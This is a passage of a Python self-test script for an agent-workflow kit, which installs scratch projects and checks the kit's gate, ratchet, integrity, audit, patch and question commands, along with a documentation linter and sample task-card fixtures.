#!/usr/bin/env python3
"""selftest.py [workdir] | selftest.py --lint-only - proves the kit end to end: installs it into throw-away projects
and exercises every guard (green path AND red path), then runs the doc-rot guard (kit-lint) on the kit tree.
Needs only python3. Prints one line per check; exit 0 only if every check passes (SKIP is not a failure).
The scratch dir it made itself (awkit_selftest_*) is removed on PASS and kept on FAIL; a workdir you pass is never removed.
  --lint-only   run only the kit-lint section (fast, no install)
Env: AW_BASH=<path to bash> forces the shell used by the wrapper checks (a bare `bash` from Python on Windows is WSL)."""
import importlib.util
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import time
from pathlib import Path

sys.dont_write_bytecode = True   # kit-lint imports aw.py: a .pyc left in payload/ would be installed into every project
KIT = Path(__file__).resolve().parent
PRISTINE_NAMES = [
    "init installs", "re-init never overwrites (collisions go to kit_stage)", "gate OK on green suite, count=3",
    "gate.sh wrapper works", "raw tail evidence written", "raise without --i-am-architect refused", "raise to 3",
    "floor cannot be lowered", "RED: failing test -> GATE FAIL", "ratchet: fewer tests than floor -> GATE FAIL",
    "restored -> GATE OK", "no baseline -> UNMEASURED (not a silent pass)", "baseline write refused for non-architect",
    "baseline written", "integrity OK on baseline", "RED: frozen file changed -> FAIL", "--allow tolerates declared drift",
    "RED: metric above ceiling -> FAIL", "RED: ZERO metric non-zero -> FAIL", "ceiling only falls (2 -> 1)",
    "RED: key-like text -> SECRETS FAIL, file:line only", "RED: .env not git-ignored -> FAIL (name only)",
    "ignored .env -> WARN, audit passes", "RED: file outside OWNS -> FAIL", "OWNS respected -> audit PASS + ledger block",
    "architect append is allowed", "RED: rewritten ledger history -> FAIL", "assert-once patch applies once, keeps CRLF",
    "RED: patch whose OLD is gone -> refused, nothing written", "backup copies", "RED: backup refuses to overwrite",
    "worker asks via QUESTIONS.md (Q-001)", "report <= 60 lines, lists open question", "ANSWER closes the question",
]
fails, skips, checks = [], [], []
LOG = []


def check(name, cond, info=""):
    checks.append(name)
    if not cond and os.environ.get("AW_DEBUG"):
        print(f"DEBUG {name!r} got: {str(info)!r}")
    print(("PASS " if cond else "FAIL ") + name + ("" if cond else f"  <- {str(info)[:300]}"))
    if not cond:
        fails.append(name)


def skip(name, why):
    skips.append(name)
    print(f"SKIP {name} (UNMEASURED: {why})")


def sh(args, cwd=None, env=None, timeout=300):
    e = dict(os.environ)
    e.update(env or {})
    r = subprocess.run([str(a) for a in args], cwd=str(cwd or os.getcwd()), stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                       encoding="utf-8", errors="replace", timeout=timeout, env=e)
    return r.returncode, r.stdout or ""


def find_bash():
    """A real bash: env AW_BASH, then shutil.which rejecting System32/WSL, then the usual git-bash paths."""
    cands = []
    if os.environ.get("AW_BASH"):
        cands.append(os.environ["AW_BASH"])
    w = shutil.which("bash")
    if w:
        cands.append(w)
    if os.name == "nt":
        for base in (os.environ.get("ProgramFiles", "C:/Program Files"), os.environ.get("ProgramFiles(x86)", "C:/Program Files (x86)"),
                     os.environ.get("LOCALAPPDATA", "")):
            if base:
                cands += [base + "/Git/bin/bash.exe", base + "/Git/usr/bin/bash.exe", base + "/Programs/Git/bin/bash.exe"]
    else:
        cands += ["/bin/bash", "/usr/bin/bash"]
    for c in cands:
        try:
            p = Path(c)
            if not p.is_file():
                continue
        except OSError:
            continue
        low = str(p).lower().replace("\\", "/")
        if "/windows/system32/" in low or "windowsapps" in low:
            continue
        return str(p)
    return None


BASH = find_bash()


def new_project(root: Path, name: str, tests: int = 3):
    """Install a throw-away project with a tiny unittest suite wired into kit.env."""
    P = root / name
    rc, out = sh([sys.executable, str(KIT / "init_project.py"), str(P), "--name", name])
    assert rc == 0, out
    (P / "tests").mkdir(exist_ok=True)
    (P / "tests/__init__.py").write_text("", encoding="utf-8", newline="")
    (P / "tests/test_a.py").write_text(
        "import unittest\nclass T(unittest.TestCase):\n" + "".join(f"    def test_{i}(self): pass\n" for i in range(1, tests + 1)),
        encoding="utf-8")
    env = (P / "tools/kit.env").read_text(encoding="utf-8")
    env = env.replace("TEST_CMD=python3 -m pytest -q", f"TEST_CMD={sys.executable} -I -B -m unittest discover -s tests -t . -v")
    env = env.replace("COUNT_REGEX=(\\d+) passed", "COUNT_REGEX=Ran (\\d+) tests?")
    env = env.replace("PY=python3", f"PY={sys.executable}")
    (P / "tools/kit.env").write_text(env, encoding="utf-8", newline="")
    (P / ".gitignore").write_text("backups/\nkit_stage/\n", encoding="utf-8", newline="")
    return P


def aw(P: Path, *a, env=None, timeout=300):
    return sh([sys.executable, "-I", "-B", "tools/aw.py", *a], cwd=P, env=env, timeout=timeout)


# ================================================================ kit-lint (data-driven doc-rot guard)
GENERATED = (  # paths a project creates at run time; every other referenced path must exist in payload/
    ".aw/baseline.json", ".aw/baseline.log", ".aw/ledger.json", ".aw/task-start",
    ".hermes/plans/REPORT_latest.md", ".hermes/plans/LEARN_latest.md", ".hermes/plans/gate_output/*", ".hermes/plans/backups/*",
    ".hermes/plans/HANDOFF_*.md", ".hermes/plans/QUESTIONNAIRE_*.md", ".hermes/plans/AUTHOR_ANSWERS_*.md",
    ".hermes/plans/ROADMAP_*.md", ".hermes/plans/cards/QUEUE_*.md", ".hermes/plans/cards/T-*.md",
    ".hermes/plans/cards/CHK-*.md", ".hermes/plans/cards/SPEC-*.md", ".hermes/plans/GUIDE.md",
    "kit_stage/*", "_to_delete/*",
)
LINT_SKIP = ("selftest.py", "IDEA.md", "CHANGELOG.md")   # fixtures/history: their sample text is data, not docs
BUDGETS = [
    ("payload/.hermes/prompts/WORKER.md", 6500), ("payload/.hermes/prompts/ARCHITECT.md", 9000), ("payload/.hermes/prompts/SWARM.md", 10000),
    ("payload/.hermes/plans/CARD_PATTERNS.md", 13500), ("payload/.hermes/plans/PLAYBOOK.md", 11000),
    ("payload/.hermes/plans/START_BLOCKS.md", 6500), ("payload/.hermes/plans/TASK_CARD.template.md", 4500),
    ("docs/GUIDE.bg.md", 20000), ("docs/GUIDE.en.md", 20000), ("docs/START_HERE.md", 4500),
]
PLAN_BUDGET = 4500
MARKERS = [
    ("payload/.hermes/prompts/WORKER.md", [r"PASS T-NNN gate=OK count=", r"STOP: <key> missing in <path>", r"QUEUE DONE",
                                         r"characterization\): skip", r"UNMEASURED, witness", r"gate_output/ files it names"]),
    ("payload/.hermes/prompts/ARCHITECT.md", [r"`AGENTS\.md` whole", r"not a kit project"]),
    ("payload/.hermes/plans/cards/QUEUE.template.md", [r"Chain:", r"QUEUE DONE <n PASS> / <n FAIL> / <n STOP>"]),
    ("payload/.hermes/plans/WORKLOG.md", [r"## T-NNN \| <date -Iseconds> \| PASS\|FAIL"]),
    ("payload/.hermes/plans/QUESTIONS.md", [r"ANSWER Q-NNN"]),
    ("payload/.hermes/plans/AUDIT_LEDGER.md", [r"^## 8\. RE-AUDIT LOG"]),
    ("payload/.hermes/plans/MODULES.md", [r"^\| ID \| Module \| Purpose \| OWNS \| Depends \| Wave \| Gate \| Decides \| Status \|"]),
]
FORBIDDEN_CMDS = {"integrity", "ratchet", "gate", "audit", "doctor", "start", "restore", "backup", "patch", "report", "ask", "answer",
                  "next-id", "card-lint", "queue-check", "modules", "improve"}
RE_WR = re.compile(r"worker_report\.py\s+(--[a-z-]+)")
ENGINE_BUDGET = 1250   # CONTRACT asks ~900; v2.0.1 (17 commands incl. the card linter, a subset of the 46 rules) measured 1226 lines


def kit_files(kit: Path):
    out = []
    for p in sorted(kit.rglob("*")):
        if p.is_file() and not any(x in p.parts for x in ("__pycache__", ".mypy_cache", ".pytest_cache", ".ruff_cache", ".git", "kit_stage")):
            out.append((p, p.relative_to(kit).as_posix()))
    return out


def code_regions(text: str):
    """(kind, line_no, text) for fenced blocks and inline spans - prose is never scanned for commands."""
    out, fence, i = [], None, 0
    for n, ln in enumerate(text.split("\n"), 1):
        m = re.match(r"^\s{0,3}(```+|~~~+)", ln)
        if m:
            if fence is None:
                fence = m.group(1)[0]
                continue
            if m.group(1)[0] == fence:
                fence = None
                continue
        if fence is None:
            for s in re.findall(r"`([^`\n]+)`", ln):
                out.append(("span", n, s))
        else:
            out.append(("fence", n, ln))
    return out


def kit_lint(kit: Path = KIT, engine: Path | None = None) -> list:
    """Doc-rot guard: every command/path/placeholder/budget/marker in the kit's text must be real. Findings = [(where, msg)]."""
    f: list = []
    engine = engine or kit / "payload/tools/aw.py"
    spec = importlib.util.spec_from_file_location("awkit_engine_for_lint", engine)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    cmds = {k: v[2] for k, v in mod.COMMANDS.items()}
    doc = mod.__doc__ or ""
    for c in cmds:
        if not re.search(rf"^\s+{re.escape(c)}\b", doc, re.M):
            f.append(("payload/tools/aw.py", f"command {c!r} missing from the --help docstring"))
    files = kit_files(kit)
    payload = kit / "payload"
    pl = {rel for _p, rel in kit_files(payload)}
    kitrel = {rel for _p, rel in files}   # kit-level docs (docs/, profiles/) are real paths too
    gen = list(GENERATED)
    texts = [(p, rel) for p, rel in files if p.suffix in (".md", ".py", ".env", ".txt", "")
             and rel != "payload/tools/aw.py" and rel not in LINT_SKIP and not rel.startswith("dev/")]
    for p, rel in texts:
        try:
            text = p.read_text(encoding="utf-8", errors="replace")
        except OSError:
            continue
        for kind, n, chunk in code_regions(text):
            for m in re.finditer(r"aw\.py[\"'\s]+([a-z][a-z-]*)", chunk):
                if m.group(1) not in FORBIDDEN_CMDS:
                    f.append((f"{rel}:{n}", f"`aw.py {m.group(1)}` is not a command -> real: {', '.join(sorted(FORBIDDEN_CMDS))}"))
                    continue
                rest = chunk[m.end():].split(chr(10), 1)[0].split(chr(96), 1)[0]   # flags: same line, same inline span
                # flags come from the engine itself: this command's booleans + the shared valued flags
                for flag in re.findall(r"\s(--[a-z][a-z-]+)", rest):
                    if flag not in set(cmds[m.group(1)]) | set(mod.VAL_FLAGS) | {"--help"}:
                        f.append((f"{rel}:{n}", f"`aw.py {m.group(1)} {flag}`: {flag} is not a flag of {m.group(1)} -> "
                                               + (f"its flags: {', '.join(cmds[m.group(1)]) or 'none'}")))
            for m in RE_WR.finditer(chunk):
                if m.group(1) not in ("--ask",):
                    f.append((f"{rel}:{n}", f"worker_report.py {m.group(1)} is not a real flag (only --ask)"))
            for tok in (re.findall(r"`([^`\n]+)`", chunk) if kind == "fence" else [chunk.strip().strip("`")]):
                tok = tok.strip().rstrip(".,;:")
                tok = tok.split()[0] if " " in tok else tok          # a span may be "tools/aw.py audit": take the path
                if not re.match(r"^`?([.]?(hermes|aw|tools)/|AGENTS\.md|docs/|profiles/|dev/)", tok):
                    continue
                norm = re.sub(r"<[^>]*>", "*", tok).replace("\\", "/").rstrip("/")
                ok = False
                for n1 in _brace(norm):
                    if (any(fnmatch_ok(n1, g) for g in gen) or any(fnmatch_ok(x, n1) for x in pl)
                            or any(fnmatch_ok(x, n1 + "/*") for x in pl) or any(fnmatch_ok(x, n1) for x in kitrel)
                            or any(fnmatch_ok(x, n1 + "/*") for x in kitrel)):
                        ok = True
                        break
                if not ok:
                    f.append((f"{rel}:{n}", f"`{tok}` does not exist in payload/ nor on the GENERATED list -> create it or fix the path"))
    allowed = {"PROJECT_NAME", "DATE", "OWNER", "REPLY_LANG"}
    for p, rel in files:
        if not (rel.startswith("payload/") or rel.startswith("docs/") or rel.startswith("profiles/")):
            continue
        raw = p.read_bytes()
        if b"\r" in raw:
            f.append((rel, "CRLF/CR in a payload file -> save LF (.gitattributes only declares the policy)"))
        if raw.startswith(b"\xef\xbb\xbf"):
            f.append((rel, "UTF-8 BOM -> strip it (a heredoc terminator then never matches)"))
        try:
            text = raw.decode("utf-8")
        except UnicodeDecodeError:
            f.append((rel, "not valid UTF-8"))
            continue
        for ph in re.findall(r"\{\{\s*([A-Za-z_][A-Za-z0-9_]*)\s*\}\}", text):
            if ph not in allowed:
                f.append((rel, f"placeholder {{{{{ph}}}}} is not one of the 4 allowed ({', '.join(sorted(allowed))}) -> init_project cannot fill it"))
    for want, limit in BUDGETS:
        t = (kit / want).read_text(encoding="utf-8", errors="replace") if (kit / want).is_file() else ""
        if len(t) > limit:
            f.append((want, f"{len(t)} chars > budget {limit} -> cut, a prompt is paid on every turn"))
    for p, rel in files:
        if rel.startswith("payload/.hermes/plans/") and rel.endswith(".md") and "template" not in rel.lower() and rel not in ("payload/.hermes/plans/PLAYBOOK.md", "payload/.hermes/plans/CARD_PATTERNS.md", "payload/.hermes/plans/START_BLOCKS.md", "payload/.hermes/plans/MODULES.md", "payload/.hermes/plans/ROADMAP.md", "payload/.hermes/plans/GUIDE.md"):
            n = len(p.read_text(encoding="utf-8", errors="replace"))
            if n > PLAN_BUDGET:
                f.append((rel, f"{n} chars > plan-template budget {PLAN_BUDGET}"))
    for rel, pats in MARKERS:
        p = kit / rel
        t = p.read_text(encoding="utf-8", errors="replace") if p.is_file() else ""
        for pat in pats:
            if not re.search(pat, t, re.M):
                f.append((rel, f"missing machine marker /{pat}/ -> engine, docs and selftest grep this literal"))
    # the owner docs name paste blocks (BLOCK 0, BLOCK Q ...): each must be defined in START_BLOCKS.md
    sbp = kit / "payload/.hermes/plans/START_BLOCKS.md"
    defined = set(re.findall(r"(?m)^## BLOCK (\w+)\b", sbp.read_text(encoding="utf-8", errors="replace") if sbp.is_file() else ""))
    for p, rel in files:
        if rel.startswith("docs/") and rel.endswith(".md"):
            for b in sorted(set(re.findall(r"\bBLOCK ([0-9A-Z])\b", p.read_text(encoding="utf-8", errors="replace")))):
                if b not in defined:
                    f.append((rel, f"BLOCK {b} is not defined in START_BLOCKS.md (defined: {', '.join(sorted(defined))})"))
    eng = (kit / "payload/tools/aw.py").read_text(encoding="utf-8", errors="replace")
    if len(eng.splitlines()) > ENGINE_BUDGET:
        f.append(("payload/tools/aw.py", f"{len(eng.splitlines())} lines > ENGINE_BUDGET={ENGINE_BUDGET}"
                  " -> split card-lint data out or cut a command (architect decision)"))
    # the owner guides quote tool output literally: every run of 3+ lowercase words inside a quoted span must be printable by a tool
    corpus = re.sub(r"\s+", " ", " ".join(p.read_text(encoding="utf-8", errors="replace") for p, rel in files
                                         if rel.startswith("payload/tools/") or rel in ("init_project.py", "selftest.py")))
    for p, rel in files:
        if not re.fullmatch(r"docs/(GUIDE\.(bg|en)|START_HERE)\.md", rel):
            continue
        for kind, n, chunk in code_regions(p.read_text(encoding="utf-8", errors="replace")):
            s = re.sub(r"<[^>]*>", "|", chunk)
            if kind not in ("span", "fence") or chunk.count("|") >= 2 or "+--" in chunk or re.search(r"[\u0400-\u04FF]|tools/|aw\.py|\.(md|py|json|txt|env)\b|^(python3|bash|git|cd|OWNS=)\b", s):
                continue
            for run in re.findall(r"(?:[a-z][a-z_]*[,:.?)]*\s+){2,}[a-z][a-z_]*[,:.?)]*", s):
                run = re.sub(r"\s+", " ", run).strip(" ,:.?)")
                if run not in corpus:
                    f.append((f"{rel}:{n}", f"quoted tool output {run!r} is not printed by any tool -> quote the real line"))
    return f


def fnmatch_ok(rel: str, pat: str) -> bool:
    import fnmatch
    return fnmatch.fnmatch(rel, pat) or rel == pat


def _brace(s: str) -> list:
    """Expand one level of shell-style {a,b} alternatives: docs write `.hermes/plans/{A,B}.md`."""
    m = re.search(r"\{([^{}]*)\}", s)
    if not m:
        return [s]
    out = []
    for part in m.group(1).split(","):
        out.extend(_brace(s[:m.start()] + part.strip() + s[m.end():]))
    return out


def section_lint(work: Path):
    print("\n-- kit-lint (doc-rot guard: commands, paths, placeholders, LF, budgets, markers)")
    f = kit_lint()
    print(f"   lint findings on {KIT.name}: {len(f)}")
    for w, m in f[:40]:
        print(f"   LINT {w}: {m}")
    check("kit-lint clean on the kit tree", not f, f[:6])
    laws = ("payload/.hermes/prompts/WORKER.md", "payload/.hermes/plans/PLAYBOOK.md", "profiles/hermes-worker.SOUL.md", "profiles/hermes-architect.SOUL.md")
    nolaw = [rel for rel in laws if not re.search(r"LAW-3[^\n]*every command[^\n]*except a LAW-4 heredoc write[^\n]*no `timeout`, no `bash`", (KIT / rel).read_text(encoding="utf-8"))]
    check("LAW-3 says `except a LAW-4 heredoc write ... no `timeout`, no `bash`` in WORKER.md, PLAYBOOK.md and both SOUL templates (2.7.1: `timeout` led every command, so the Hermes terminal scanned a heredoc body for ' & '; a pilot worker then wrapped the write in `timeout bash <<`)", not nolaw, nolaw)
    pr = subprocess.run([sys.executable, "-B", str(KIT / "dev/card_lint_reference/lint_probe.py"), "selftest"], capture_output=True, text=True, encoding="utf-8", errors="replace")
    check("dev/card_lint_reference: the reference linter passes its own selftest on the published rules (docs/CARD_LINT_RULES.md names it)", pr.returncode == 0 and "SELFTEST PASS" in pr.stdout, (pr.stdout + pr.stderr)[-300:])
    dl = subprocess.run([sys.executable, "-B", str(KIT / "dev/card_lint_reference/diff_lint.py"), str(KIT)], capture_output=True, text=True, encoding="utf-8", errors="replace")
    check("dev/diff_lint: engine card-lint vs the reference = 4 fixtures clean, 16 of 39 variants missed (the numbers HONEST_LIMITS, README, both guides and START_HERE state: change them together)", "fixtures_diff=0 mutants=39 missed=16 " in dl.stdout, dl.stdout[-250:])
    qt = (KIT / "payload/.hermes/plans/cards/QUEUE.template.md").read_text(encoding="utf-8")
    chain_lines = [ln.strip()[:40] for ln in qt.splitlines() if ln.strip().startswith("Chain:")]
    check("QUEUE.template.md has exactly one Chain: line (queue-check counts indented ones: a worked example made every copy fail)", len(chain_lines) == 1, chain_lines)
    # red path: a deliberately broken copy must be caught by every area
    bad = work / "badkit"
    (bad / "payload/tools").mkdir(parents=True, exist_ok=True)
    (bad / "payload/.hermes/prompts").mkdir(parents=True, exist_ok=True)
    (bad / "payload/.hermes/plans/cards").mkdir(parents=True, exist_ok=True)
    (bad / "docs").mkdir(parents=True, exist_ok=True)
    shutil.copy(KIT / "payload/tools/aw.py", bad / "payload/tools/aw.py")
    for rel, pats in MARKERS:
        (bad / rel).parent.mkdir(parents=True, exist_ok=True)
        (bad / rel).write_text("marker-less\n", encoding="utf-8", newline="")
    (bad / "payload/.hermes/plans/PLAN_latest.md").write_text(
        "# plan\nrun `python3 tools/aw.py frobnicate` then `aw.py gate --nope`\nsee `.hermes/plans/does_not_exist.md`\n",
        encoding="utf-8", newline="")
    (bad / "payload/.hermes/prompts/WORKER.md").write_text("{{PROJECT_NAME}} {{NOPE}}\n", encoding="utf-8", newline="")
    (bad / "payload/.hermes/plans/cards/QUEUE.template.md").write_bytes(b"Chain: base=0\r\n")
    (bad / "docs/GUIDE.en.md").write_text("x" * (dict(BUDGETS)["docs/GUIDE.en.md"] + 1), encoding="utf-8", newline="")
    (bad / "docs/GUIDE.bg.md").write_text("see `WARN the frobnicator is wedged badly` now\n", encoding="utf-8", newline="")
    (bad / "payload/tools/worker_report.py").write_text("`worker_report.py --repot`\n", encoding="utf-8", newline="")
    (bad / "docs/START_HERE.md").write_text("paste BLOCK Z now\n", encoding="utf-8", newline="")
    bf = kit_lint(bad, bad / "payload/tools/aw.py")
    areas = {"unknown-command": any("is not a command" in m for _w, m in bf), "unknown-flag": any("is not a flag" in m for _w, m in bf),
             "missing-path": any("does not exist" in m for _w, m in bf), "placeholder": any("placeholder" in m and "allowed" in m for _w, m in bf),
             "crlf": any("CRLF" in m for _w, m in bf), "budget": any("budget" in m for _w, m in bf),
             "marker": any("machine marker" in m for _w, m in bf),
             "invented-output": any("quoted tool output" in m for _w, m in bf),
             "block-ref": any("is not defined in START_BLOCKS" in m for _w, m in bf)}
    for k, v in areas.items():
        check(f"kit-lint RED catches {k}", v, [m for _w, m in bf][:8])
    shutil.rmtree(bad, ignore_errors=True)


LINT_CARD_ROTE = """# T-050 - probe
Status: READY | Lane: ROTE | Depends: - | Module: - | Author decisions needed: none

## GOAL
After this card `src/a.py` exists, proven by `GATE OK count=3 min=3`.

## OWNS
- src/a.py

## READ-ONLY
- everything else

## PRE-FLIGHT
| # | Command | Expected |
|---|---|---|
| 1 | `bash tools/gate.sh pre-T-050` | `GATE OK count=3 min=3` |
| 2 | `python3 -I -B tools/aw.py integrity` | `INTEGRITY OK frozen=0 metrics=0` |

## BACKUP
`python3 -I -B tools/aw.py start T-050`
NEW: src/a.py

## STEPS
| # | Action | Expected |
|---|---|---|
| 1 | write `src/a.py` (block below) | `file exists` |
| 2 | `python3 -c "print(1)" | tail -1` | `1` |

```bash
cat > src/a.py <<'EOF'
x = 1
EOF
```

## RED PROOF
n/a - characterization: the check must pass on the first run

## GATE
CHAIN: ran=3 +0 -> ran=3 (MEASURED)
| # | Command | Expected |
|---|---|---|
| 1 | `bash tools/gate.sh T-050` | `GATE OK count=3 min=3` |
| 2 | `OWNS='src/a.py' bash tools/re_audit.sh T-050` | `AUDIT PASS` |

## INVARIANTS
- no frozen file, no new dependency, no commit

## STOP
Mismatch => ROLLBACK, FAIL format, `--ask`.

## ROLLBACK
`python3 -I -B tools/aw.py restore T-050` => `RESTORED 0 file(s) from backups/T-050/`.

## EVIDENCE
gate_output/T-050.txt + WORKLOG entry.

## AFTER
Architect: re-baseline? no.

## DRY-RUN PROOF
```bash
$ bash tools/gate.sh pre-T-050
GATE OK count=3 min=3
$ python3 -I -B tools/aw.py integrity
INTEGRITY OK frozen=0 metrics=0 (core=32)
```
"""
LINT_CARD_SPEC = """# SPEC-050 - probe
Status: READY | Lane: SPEC | Depends: - | Module: - | Author decisions needed: none
Executor: claude-sonnet (strong model, separate session)

## GOAL
After this card the page matches the reference screenshot, proven by the executor's own tests.

## OWNS
- web/index.html

## READ-ONLY
- everything else

## PRE-FLIGHT
| # | Command | Expected |
|---|---|---|
| 1 | `bash tools/gate.sh pre-SPEC-050` | `GATE OK count=3 min=3` |
| 2 | `python3 -I -B tools/aw.py integrity` | `INTEGRITY OK frozen=0 metrics=0` |

## BACKUP
`python3 -I -B tools/aw.py start SPEC-050`
NEW: none

## STEPS
Reference beside current state; the executor writes its tests FIRST; judgement on layout is the executor's.

## RED PROOF
The executor's new test fails before the page change.

## GATE
CHAIN: ran=3 +0 -> ran=3 (UNMEASURED)

## INVARIANTS
- no new route

## STOP
Mismatch => ROLLBACK, FAIL format, `--ask`.

## ROLLBACK
`python3 -I -B tools/aw.py restore SPEC-050` => `RESTORED 1 file(s) from backups/SPEC-050/`.

## EVIDENCE
gate_output/SPEC-050.txt + WORKLOG entry.

## AFTER
Architect: re-baseline? no.
"""


def section_gaps(work: Path):
    """Behaviour that a one-token change of aw.py could alter with the suite still green.
    Found by mutating the engine (2.8.1: 81 of 200 sampled mutants survived); each check below fails on at least one of them."""
    print("\n-- gaps found by mutating the engine")
    G = new_project(work, "gaps")
    plans = G / ".hermes/plans"

    def put(P, rel, data):
        (P / rel).parent.mkdir(parents=True, exist_ok=True)
        (P / rel).write_bytes(data if isinstance(data, bytes) else data.encode("utf-8"))

    # ---- dispatch
    rc0, o0 = aw(G)
    rc1, o1 = aw(G, "--help")
    rc2, o2 = aw(G, "gat")
    rc3, o3 = aw(G, "gate", "--nope")
    check("dispatch: no command -> the command list and exit 2; --help -> exit 0; a typo names the nearest command; an unknown flag -> exit 2",
          rc0 == 2 and "card-lint" in o0 and rc1 == 0 and "card-lint" in o1 and rc2 == 2 and "did you mean `gate`?" in o2
          and rc3 == 2 and "unknown flag --nope" in o3 and "Traceback" not in o0 + o1 + o2 + o3, (rc0, rc1, rc2, o2, rc3, o3))

    # ---- gate: a count that was never parsed is a FAIL at any floor
    env0 = (G / "tools/kit.env").read_text(encoding="utf-8")
    put(G, "tools/kit.env", env0.replace("COUNT_REGEX=Ran (\\d+) tests?", "COUNT_REGEX=Nope (\\d+)"))
    rc, out = aw(G, "gate", "nocount")
    check("RED: a green suite whose output never matches COUNT_REGEX -> GATE FAIL count=0 min=0 reason=no-count-parsed (floor 0 forgives nothing)",
          rc == 1 and "GATE FAIL count=0 min=0 reason=no-count-parsed" in out, out)
    put(G, "tools/kit.env", env0.replace("TEST_DIR=.", "TEST_DIR=no_such_dir"))
    rc, out = aw(G, "gate", "nodir")
    check("RED: TEST_DIR that is not a directory -> exit 2 naming kit.env, no gate file", rc == 2 and "is not a directory" in out
          and not (plans / "gate_output/nodir.txt").exists(), out)
    put(G, "tools/kit.env", env0)

    # ---- ask / answer
    (plans / "QUESTIONS.md").unlink()
    rc1, o1 = aw(G, "ask", "first?")
    rc2, o2 = aw(G, "ask", "second?")
    rc3, o3 = aw(G, "ask")
    q = (plans / "QUESTIONS.md").read_text(encoding="utf-8")
    check("ask: creates a missing QUESTIONS.md; the second question is Q-002 and the first one stays; no text -> usage, exit 2",
          rc1 == 0 and "ASKED Q-001" in o1 and "ASKED Q-002" in o2 and "## Q-001 |" in q and "> first?" in q and "> second?" in q
          and rc3 == 2 and "usage" in o3, (o1, o2, rc3, o3, q))
    aw(G, "answer", "Q-001", "180000", "ms")
    put(G, ".hermes/plans/QUESTIONS.md", (plans / "QUESTIONS.md").read_text(encoding="utf-8").rstrip("\n"))
    aw(G, "answer", "Q-002", "yes")
    rcb, ob = aw(G, "answer", "QQ-1", "x")
    q = (plans / "QUESTIONS.md").read_text(encoding="utf-8")
    check("answer: every word reaches the ANSWER line; one line break before it with or without a trailing newline in the file; a bad id -> exit 2",
          bool(re.search(r"(?m)^ANSWER Q-001 \d{4}-\d\d-\d\d 180000 ms$", q)) and bool(re.search(r"(?m)^ANSWER Q-002 \d{4}-\d\d-\d\d yes$", q))
          and "\n\nANSWER" not in q and rcb == 2 and "'QQ-1' is not a question id" in ob, (q[-300:], rcb, ob))

    # ---- report: the newest gate file, not a neighbour
    aw(G, "gate", "older")
    aw(G, "gate", "newer")
    t = time.time()
    for f in (plans / "gate_output").glob("*.txt"):
        os.utime(f, (t - 900, t - 900) if f.name != "newer.txt" else (t, t))
    aw(G, "report")
    rep = (plans / "REPORT_latest.md").read_text(encoding="utf-8")
    check("report: `last gate file` is the newest file in gate_output/", "last gate file: newer.txt @ " in rep, rep[:400])

    # ---- restore: a file the card created is reported, never deleted
    put(G, "src/x.py", "v1\n")
    aw(G, "start", "T-060")
    aw(G, "backup", "T-060", "src/x.py")
    put(G, "src/x.py", "v2\n")
    put(G, "src/new.py", "created by the card\n")
    rc, out = aw(G, "restore", "T-060")
    check("restore: puts the backup back, prints NOT-RESTORED-NEW for a file the card created and leaves that file in place",
          rc == 0 and "NOT-RESTORED-NEW src/new.py" in out and "RESTORED 1 file(s) from backups/T-060/" in out
          and (G / "src/x.py").read_bytes() == b"v1\n" and (G / "src/new.py").is_file(), out)

    # ---- patch: a block that grows keeps every line break, at EOF and with mixed endings
    put(G, "old_g.txt", "a = 1\n")
    put(G, "new_g.txt", "a = 1\nb = 2\n")
    put(G, "src/eof.txt", b"x = 0\na = 1")
    put(G, "src/eofcr.txt", b"x = 0\r\na = 1")
    rc1, o1 = aw(G, "patch", "src/eof.txt", "old_g.txt", "new_g.txt")
    rc2, o2 = aw(G, "patch", "src/eofcr.txt", "old_g.txt", "new_g.txt")
    check("patch: the last line of a file without a final newline grows into two lines, not into one glued line (2.8.1 wrote `a = 1b = 2`)",
          rc1 == 0 and (G / "src/eof.txt").read_bytes() == b"x = 0\na = 1\nb = 2"
          and rc2 == 0 and (G / "src/eofcr.txt").read_bytes() == b"x = 0\r\na = 1\r\nb = 2", ((G / "src/eof.txt").read_bytes(), (G / "src/eofcr.txt").read_bytes()))
    put(G, "src/mixg.py", b"a = 1\r\nb = 2\nc = 3\n")
    put(G, "old_m.txt", "a = 1\nb = 2\n")
    put(G, "new_m.txt", "a = 1\nb = 2\nb2 = 7\n")
    rc, out = aw(G, "patch", "src/mixg.py", "old_m.txt", "new_m.txt")
    check("patch: a grown block in a mixed-ending file gives the added line the ending of the block's last line",
          rc == 0 and (G / "src/mixg.py").read_bytes() == b"a = 1\r\nb = 2\nb2 = 7\nc = 3\n", (G / "src/mixg.py").read_bytes())

    # ---- doctor: the OK lines of a fresh install, and the two WARNs they turn into
    rc, out = aw(G, "doctor")
    put(G, ".gitignore", ".env\nbackups/\nkit_stage/\n")
    (G / "AGENTS.md").rename(G / "AGENTS.md.off")
    rc2, out2 = aw(G, "doctor")
    (G / "AGENTS.md.off").rename(G / "AGENTS.md")
    check("doctor: fresh install prints OK for kit-files and kit-v2 and WARN for a .gitignore without .env; "
          "a covering .gitignore -> OK; a missing AGENTS.md -> WARN kit-v2 naming it",
          "DOCTOR OK kit-files: all present" in out and "DOCTOR OK kit-v2: all present" in out and "DOCTOR WARN gitignore: missing: .env" in out
          and "DOCTOR OK gitignore: covers" in out2 and "DOCTOR WARN kit-v2: missing: AGENTS.md" in out2, out + out2)
    if shutil.which("git"):
        sh(["git", "init", "-q"], cwd=G)
        sh(["git", "config", "user.name", "Self Test"], cwd=G)
        sh(["git", "config", "user.email", "selftest@example.invalid"], cwd=G)
        rc, out = aw(G, "doctor")
        check("doctor: a repository with user.name and user.email -> OK git-identity", "DOCTOR OK git-identity:" in out, out)
    else:
        skip("doctor: a repository with user.name and user.email -> OK git-identity", "no git on PATH")

    # ---- audit: stale WORKLOG, the card's closed OWNS list, a ledger row edited in place
    A = new_project(work, "gapaudit")
    ap = A / ".hermes/plans"
    aw(A, "gate", "baseline")
    aw(A, "ratchet", "--raise", "3", "--i-am-architect")
    put(A, ".hermes/plans/cards/T-050.md", LINT_CARD_ROTE)
    aw(A, "integrity", "--write-baseline", "--i-am-architect")
    t = time.time()
    for f in (ap / "gate_output").glob("*.txt"):
        os.utime(f, (t - 10000, t - 10000))
    os.utime(ap / "WORKLOG.md", (t - 7200, t - 7200))
    rc, out = aw(A, "audit")
    os.utime(ap / "gate_output/baseline.txt", (t, t))
    rc2, out2 = aw(A, "audit")
    check("audit: a WORKLOG two hours older than a card's gate file -> WARN; the audit's own audit-*.txt never triggers it",
